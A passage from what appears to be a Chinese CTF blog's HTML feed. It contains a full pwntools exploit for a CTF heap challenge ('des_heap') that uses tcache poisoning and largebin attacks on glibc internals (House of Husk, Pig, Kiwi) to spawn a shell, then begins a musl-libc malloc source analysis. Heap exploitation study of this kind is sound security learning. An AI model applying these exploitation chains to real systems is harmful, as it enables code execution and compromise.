class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,27834)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    <span class="hljs-comment"># sleep(0.5)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(system_addr) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>bin_sh_addr = heap_base + <span class="hljs-number">0xA00</span><br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64((bin_sh_addr - <span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Exp-House-of-Corrosion"><a class="header-anchor" href="#Exp-House-of-Corrosion">¶</a>Exp.House of Corrosion</h3><h1>参考资料</h1><p><a href="https://fmyy.pro/">肥猫嘤嘤’s blog</a></p><p><a href="https://www.anquanke.com/post/id/202387">house-of-husk学习笔记</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">raycp 师傅的 _IO_FILE 系列文章</a></p><p><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie">_IO_FILE利用思路总结 - b0ldfrev</a></p><p><a href="https://bbs.pediy.com/thread-272098.htm">CTF 中 glibc堆利用 及 IO_FILE 总结 - winmt</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【EP.01】 musl-libc</title>
    <link href="/posts/9b2926e8.html"/>
    <url>/posts/9b2926e8.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>时间要是再多点就好了，我能避免许多遗憾。</p></blockquote><p>什么是 <strong>musl</strong> ？</p><p><strong>musl</strong>，一种C标准库，主要使用于以Linux内核为主的操作系统上，目标为嵌入式系统与移动设备。开发此库的目的是写一份干净、高效、符合标准的C标准库。</p><p>为啥要学 <strong>musl</strong> ？<strong>glibc</strong> 玩明白了？</p><p>💢 没玩明白呢还。原因一个是最近的比赛( *<strong>ctf</strong> )接触到了 <strong>musl</strong> ，想学习一下，算是拓展知识面提升自己了。</p><h1>前言</h1><p><strong>musl 1.2.2</strong> 版本源码相比较 1.1.x 有较大变动，这里先从师傅们的文章学习一下 1.2.2 ，其他的以后再来补。</p><h1>源码分析</h1><h2 id="关键数据结构"><a class="header-anchor" href="#关键数据结构">¶</a>关键数据结构</h2><p>先认识一下几个结构体：</p><h3 id="chunk"><a class="header-anchor" href="#chunk">¶</a>chunk</h3><p>源码中并没有显式地定义出 chunk 结构体，实际上其结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint8_t</span> idx;  <span class="hljs-comment">// 低 5bit 作为 idx 表示这是 group 中第几个 chunk, 高3bit作为 reserved</span><br><span class="hljs-type">uint16_t</span> offset; <span class="hljs-comment">// 与第一个 chunk 的偏移</span><br>    <span class="hljs-comment">// idx 和 offset 就是此 chunk 的元数据域了，仅占 4 Byte</span><br><span class="hljs-type">char</span> user_data[];<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">假设用户申请后获得的指针为 char *p，那么 p 就指向 user_data[] 的头部</span><br><span class="hljs-comment">    */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="group"><a class="header-anchor" href="#group">¶</a>group</h3><p><em>malloc/mallocng/meta.h</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// meta 管理 group</span><br><span class="hljs-comment">// group 管理 chunk ，其中的 storage 就是给用户使用的部分</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span 